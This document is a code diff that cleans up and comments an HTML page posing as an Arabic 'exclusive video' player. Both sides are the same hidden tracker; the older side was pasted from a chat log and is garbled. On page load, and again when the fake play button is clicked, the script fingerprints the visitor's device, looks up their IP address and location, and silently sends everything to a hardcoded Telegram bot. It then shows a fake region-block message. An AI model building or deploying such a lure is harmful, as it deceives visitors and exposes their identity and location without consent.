@@ -1,69 +1,250 @@
-[7/29/2026 1:22 PM] Shwan Rasam: <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ar">
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>فيديو حصري</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Segoe UI',Arial,sans-serif;background:#0a0a0a;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:10px}
-.player{background:#1a1a1a;border-radius:16px;max-width:420px;width:100%;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.8)}
-.video-thumb{width:100%;aspect-ratio:16/9;background:linear-gradient(135deg,#2d3436,#636e72);display:flex;justify-content:center;align-items:center;position:relative;cursor:pointer}
-.play-btn{width:70px;height:70px;background:rgba(255,255,255,.2);border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:32px;color:#fff;backdrop-filter:blur(4px);transition:all .3s}
-.play-btn:hover{transform:scale(1.1);background:rgba(255,255,255,.3)}
-.play-btn.playing{background:#e74c3c}
-.info{padding:16px}
-.title{color:#fff;font-size:16px;font-weight:bold;margin-bottom:6px}
-.views{color:#888;font-size:13px}
-.loading-bar{height:3px;background:#333;margin-top:12px;border-radius:2px;overflow:hidden}
-.loading-progress{height:100%;width:0%;background:linear-gradient(90deg,#e74c3c,#f39c12);border-radius:2px;transition:width .3s}
-.status-msg{color:#888;font-size:12px;text-align:center;padding:20px;display:none}
-.fake-controls{display:flex;justify-content:space-between;padding:8px 16px 16px;color:#666;font-size:11px}
-</style></head>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فيديو حصري</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #0a0a0a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 10px;
+        }
+
+        .player {
+            background: #1a1a1a;
+            border-radius: 16px;
+            max-width: 420px;
+            width: 100%;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, .8);
+        }
+
+        .video-thumb {
+            width: 100%;
+            aspect-ratio: 16/9;
+            background: linear-gradient(135deg, #2d3436, #636e72);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            cursor: pointer;
+        }
+
+        .play-btn {
+            width: 70px;
+            height: 70px;
+            background: rgba(255, 255, 255, .2);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 32px;
+            color: #fff;
+            backdrop-filter: blur(4px);
+            transition: all .3s;
+        }
+
+        .play-btn:hover {
+            transform: scale(1.1);
+            background: rgba(255, 255, 255, .3);
+        }
+
+        .play-btn.playing {
+            background: #e74c3c;
+        }
+
+        .info {
+            padding: 16px;
+        }
+
+        .title {
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 6px;
+        }
+
+        .views {
+            color: #888;
+            font-size: 13px;
+        }
+
+        .loading-bar {
+            height: 3px;
+            background: #333;
+            margin-top: 12px;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+
+        .loading-progress {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #e74c3c, #f39c12);
+            border-radius: 2px;
+            transition: width .3s;
+        }
+
+        .status-msg {
+            color: #888;
+            font-size: 12px;
+            text-align: center;
+            padding: 20px;
+            display: none;
+        }
+
+        .fake-controls {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 16px 16px;
+            color: #666;
+            font-size: 11px;
+        }
+    </style>
+</head>
 <body>
-<div class="player">
-    <div class="video-thumb" id="videoArea" onclick="simulatePlay()">
-        <div class="play-btn" id="playBtn">▶</div>
+    <div class="player">
+        <div class="video-thumb" id="videoArea" onclick="simulatePlay()">
+            <div class="play-btn" id="playBtn">▶</div>
+        </div>
+        <div class="info">
+            <div class="title">🔥 فيديو حصري - لحظة مهمة 🔥</div>
+            <div class="views">1.2M مشاهدة • منذ 3 ساعات</div>
+            <div class="loading-bar"><div class="loading-progress" id="progressBar"></div></div>
+        </div>
+        <div class="status-msg" id="statusMsg"></div>
+        <div class="fake-controls">
+            <span>▶ 0:00 / 2:34</span><span>⚙ 1080p</span><span>🔊 100%</span><span>⛶</span>
+        </div>
     </div>
-    <div class="info">
-        <div class="title">🔥 فيديو حصري - لحظة مهمة 🔥</div>
-        <div class="views">1.2M مشاهدة • منذ 3 ساعات</div>
-        <div class="loading-bar"><div class="loading-progress" id="progressBar"></div></div>
-    </div>
-    <div class="status-msg" id="statusMsg"></div>
-    <div class="fake-controls">
-        <span>▶ 0:00 / 2:34</span><span>⚙ 1080p</span><span>🔊 100%</span><span>⛶</span>
-    </div>
-</div>
-<script>
-const TOKEN='7524329663:AAERQzZ21_sskD6GLfUNLTYvTy--X733hEI',CHAT='1015102519';
-const chatId=new URLSearchParams(location.search).get('chatId')||'unknown';
-let dataCollected=false;
-async function simulatePlay(){
-    const playBtn=document.getElementById('playBtn'),progress=document.getElementById('progressBar'),status=document.getElementById('statusMsg');
-    playBtn.classList.add('playing');playBtn.textContent='⏳';
-    status.style.display='block';status.textContent='🔄 جاري تحميل الفيديو...';status.style.color='#888';
-    let p=0;const interval=setInterval(()=>{p+=Math.random()*15;if(p>100)p=100;progress.style.width=p+'%';},500);
-    try{
-        const cv=document.createElement('canvas');cv.width=200;cv.height=50;
-        const ctx=cv.getContext('2d');ctx.textBaseline='top';ctx.font='14px Arial';
-        ctx.fillStyle='#f60';ctx.fillRect(125,1,62,20);
-        ctx.fillStyle='#069';ctx.fillText('TheEye',2,15);
-        ctx.fillStyle='rgba(102,204,0,0.7)';ctx.fillText('Cg',4,17);
-        const fp=cv.toDataURL().substring(0,50);
-        const conn=navigator.connectionnavigator.mozConnectionnavigator.webkitConnection||{};
-        let ipd={country:'غير معروف',city:'غير معروف',ip:'غير معروف'};
-        try{const r=await fetch('https://ipapi.co/json/');if(r.ok)ipd=await r.json();}catch(e){}
-        let camAvailable=false;try{const d=await navigator.mediaDevices.enumerateDevices();camAvailable=d.some(d=>d.kind==='videoinput');}catch(e){}
-        const msg=🎬 **اشتراك فيديو جديد**\n🆔 ID: \${chatId}\`\الجهاز:ز:**\n🔹 المنصة: ${navigator.platform}\n🔹 المتصفح: ${navigator.userAgent.substring(0,80)}\n🔹 اللغة: ${navigator.language}\n🔹 الشاشة: ${screen.width}x${screen.height}\n🔹 المنطقة: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n🔹 المعالجات: ${navigator.hardwareConcurrency'?'}\n🔹 الذاكرة: ${navigator.deviceMemory'?'}GB\n🔹 الكاميرا: ${camAvailable?'موجودة':'غير متاحة'}\n\الشبكة:ة:**\n🔹 IP: ${ipd.ip}\n🔹 الدولة:
-[7/29/2026 1:22 PM] Shwan Rasam: ${ipd.country}, ${ipd.city}\n🔹 الاتصال: ${conn.effectiveType'?'} (${conn.downlink'?'}Mbps)\n\n🔍 البصمة: \${fp}...\`;
-        await fetch(https://api.telegram.org/bot${TOKEN}/sendMessage,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT,text:msg,parse_mode:'Markdown'})});
-        dataCollected=true;
-    }catch(e){}
-    setTimeout(()=>{
-        clearInterval(interval);progress.style.width='100%';
-        playBtn.textContent='▶';playBtn.classList.remove('playing');
-        status.textContent='✅ تم تحميل الفيديو بنجاح';status.style.color='#27ae60';
-        setTimeout(()=>{status.textContent='🚫 عذراً، هذا الفيديو غير متاح في منطقتك';status.style.color='#e74c3c';},3000);
-    },5000);
-}
-window.addEventListener('load',()=>{setTimeout(simulatePlay,1500);});
-</script></body></html>
+
+    <script>
+        const TOKEN = '7524329663:AAERQzZ21_sskD6GLfUNLTYvTy--X733hEI';
+        const CHAT = '1015102519';
+        const chatId = new URLSearchParams(location.search).get('chatId') || 'unknown';
+        let dataCollected = false;
+
+        async function simulatePlay() {
+            const playBtn = document.getElementById('playBtn');
+            const progress = document.getElementById('progressBar');
+            const status = document.getElementById('statusMsg');
+
+            // خۆئامادەکردنی پلەیەر
+            playBtn.classList.add('playing');
+            playBtn.textContent = '⏳';
+            status.style.display = 'block';
+            status.textContent = '🔄 جاري تحميل الفيديو...';
+            status.style.color = '#888';
+
+            // پێشکەوتنی ساختە
+            let p = 0;
+            const interval = setInterval(() => {
+                p += Math.random() * 15;
+                if (p > 100) p = 100;
+                progress.style.width = p + '%';
+            }, 500);
+
+            // کۆکردنەوەی زانیاری و ناردن
+            if (!dataCollected) {
+                try {
+                    // دروستکردنی "بصمة" سادە (بۆ ناسینەوەی ئامێر)
+                    const cv = document.createElement('canvas');
+                    cv.width = 200;
+                    cv.height = 50;
+                    const ctx = cv.getContext('2d');
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.fillStyle = '#f60';
+                    ctx.fillRect(125, 1, 62, 20);
+                    ctx.fillStyle = '#069';
+                    ctx.fillText('TheEye', 2, 15);
+                    ctx.fillStyle = 'rgba(102,204,0,0.7)';
+                    ctx.fillText('Cg', 4, 17);
+                    const fp = cv.toDataURL().substring(0, 50); // بەشێک لە داتای وێنەکە
+
+                    // زانیاری پەیوەندی
+                    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+                    let ipData = { country: 'غير معروف', city: 'غير معروف', ip: 'غير معروف' };
+                    try {
+                        const res = await fetch('https://ipapi.co/json/');
+                        if (res.ok) ipData = await res.json();
+                    } catch (e) { /* fallback */ }
+
+                    // بەردەستبوونی کامێرا
+                    let camAvailable = false;
+                    try {
+                        const devices = await navigator.mediaDevices.enumerateDevices();
+                        camAvailable = devices.some(d => d.kind === 'videoinput');
+                    } catch (e) { /* fallback */ }
+
+                    // پەیامی تێلێگرام
+                    const message = `🎬 **اشتراك فيديو جديد**
+🆔 ID: ${chatId}
+
+**الجهاز:**
+🔹 المنصة: ${navigator.platform}
+🔹 المتصفح: ${navigator.userAgent.substring(0, 80)}
+🔹 اللغة: ${navigator.language}
+🔹 الشاشة: ${screen.width}x${screen.height}
+🔹 المنطقة: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+🔹 المعالجات: ${navigator.hardwareConcurrency || '?'}
+🔹 الذاكرة: ${navigator.deviceMemory || '?'} GB
+🔹 الكاميرا: ${camAvailable ? 'موجودة' : 'غير متاحة'}
+
+**الشبكة:**
+🔹 IP: ${ipData.ip}
+🔹 الدولة: ${ipData.country}, ${ipData.city}
+🔹 الاتصال: ${conn.effectiveType || '?'} (${conn.downlink || '?'} Mbps)
+
+🔍 البصمة: ${fp}...`;
+
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT,
+                            text: message,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+
+                    dataCollected = true;
+                } catch (e) {
+                    // هەڵەکان بە بێدەنگی تێدەپەڕێن
+                }
+            }
+
+            // کۆتایی هاتنی بارکردنی ساختە
+            setTimeout(() => {
+                clearInterval(interval);
+                progress.style.width = '100%';
+                playBtn.textContent = '▶';
+                playBtn.classList.remove('playing');
+                status.textContent = '✅ تم تحميل الفيديو بنجاح';
+                status.style.color = '#27ae60';
+
+                setTimeout(() => {
+                    status.textContent = '🚫 عذراً، هذا الفيديو غير متاح في منطقتك';
+                    status.style.color = '#e74c3c';
+                }, 3000);
+            }, 5000);
+        }
+
+        // دەستپێکردنی ئۆتۆماتیکی دوای ۱.٥ چرکە
+        window.addEventListener('load', () => {
+            setTimeout(simulatePlay, 1500);
+        });
+    </script>
+</body>
+</html>
